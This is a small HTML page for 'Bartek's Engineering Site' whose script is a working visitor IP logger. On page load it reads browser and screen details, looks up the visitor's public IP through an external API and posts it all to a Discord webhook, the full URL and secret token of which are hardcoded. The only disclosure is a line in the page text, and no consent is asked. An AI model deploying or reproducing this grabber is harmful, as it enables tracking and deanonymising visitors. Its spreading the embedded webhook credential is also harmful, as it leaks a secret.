<!DOCTYPE html>
<html>
<head>
    <title>Bartek's Site</title>
    <script>
        // Function to fetch and log device and IP information
        function logDeviceInfo() {
            // Get device information
            var deviceInfo = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: window.screen.width + 'x' + window.screen.height,
                colorDepth: window.screen.colorDepth
            };

            // Fetch IP address using an external API
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ipInfo = {
                        ip: data.ip,
                        ...deviceInfo
                    };

                    // Send data to Discord webhook
                    var webhookUrl = 'https://discord.com/api/webhooks/1280941751624007720/stwdLW8D866HPVDZPAG5XoYDi6fA91jfWPaaS6nmTcsb28QU6tdPJEBVuTO_RP5tQgQ9';
                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            content: `IP: ${ipInfo.ip}\n` +
                                    `User Agent: ${ipInfo.userAgent}\n` +
                                    `Language: ${ipInfo.language}\n` +
                                    `Platform: ${ipInfo.platform}\n` +
                                    `Screen Resolution: ${ipInfo.screenResolution}\n` +
                                    `Color Depth: ${ipInfo.colorDepth}`
                        })
                    })
                    .catch(error => console.error('Error:', error));
                })
                .catch(error => console.error('Error:', error));
        }

        // Run the logging function when the page loads
        window.onload = logDeviceInfo;
    </script>
</head>
<body>
    <h1>Welcome to Bartek's Engineering Site</h1>
    <p>Your device and IP information are being logged and sent to the specified Discord webhook.</p>
</body>
</html>
